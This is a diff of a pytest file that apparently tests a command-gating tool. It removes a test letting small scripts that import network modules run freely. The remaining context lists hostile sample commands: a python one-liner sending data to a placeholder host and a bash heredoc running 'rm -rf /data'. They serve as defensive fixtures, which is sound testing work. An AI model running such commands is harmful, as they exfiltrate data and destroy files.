@@ -131,15 +131,6 @@ def test_entry_variants_sign(files, command, signal, repo):
     _assert_signs(command, repo, signal)
 
 
-@pytest.mark.parametrize("files, command", [
-    ({"tool.ts": 'import https from "https";\nconsole.log(Object.keys(https));\n'}, "bun --no-env-file tool.ts"),
-    ({"tool.cjs": 'const net = require("net");\nconsole.log(typeof net.connect);\n'}, "node tool.cjs"),
-])
-def test_signal_beyond_depth_one_or_none_runs_free(files, command, repo):
-    _write(repo, files)
-    assert _allowed(command, repo), command
-
-
 @pytest.mark.parametrize("command", [
     "python3 -c \"import urllib.request as u; u.urlopen(u.Request('https://example.invalid/x', data=b'd'))\"",
     "bash <<'EOF'\nrm -rf /data\nEOF",
